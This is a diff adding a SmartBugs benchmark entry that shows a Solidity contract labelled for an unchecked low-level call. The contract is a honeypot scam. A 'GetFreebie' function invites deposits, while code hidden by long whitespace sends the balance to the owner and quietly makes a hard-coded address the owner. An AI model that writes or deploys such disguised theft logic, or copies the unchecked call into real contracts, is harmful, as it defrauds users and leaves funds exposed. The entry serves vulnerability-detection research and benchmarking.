@@ -1,0 +1,61 @@
+---
+Dataset: smartbugs-curated
+Name: 0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol
+Category: unchecked_low_level_calls
+Pragma: 0.4.19
+Origin-Path: dataset/unchecked_low_level_calls/0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol
+Source: etherscan.io
+Vulnerable-Lines: 44
+---
+
+# Vulnerability Reference Case: unchecked_low_level_calls
+
+## Source Code
+```solidity
+/*
+ * @source: etherscan.io 
+ * @author: -
+ * @vulnerable_at_lines: 44
+ */
+
+pragma solidity ^0.4.19;
+
+contract Honey
+{
+    address public Owner = msg.sender;
+   
+    function()
+    public
+    payable
+    {
+        
+    }
+   
+    function GetFreebie()
+    public
+    payable
+    {                                                                    
+        if(msg.value>1 ether)
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+            msg.sender.transfer(this.balance);
+        }                                                                                                                
+    }
+    
+    function withdraw()
+    payable
+    public
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+    
+    function Command(address adr,bytes data)
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+        // <yes> <report> UNCHECKED_LL_CALLS
+        adr.call.value(msg.value)(data);
+    }
+}
+```
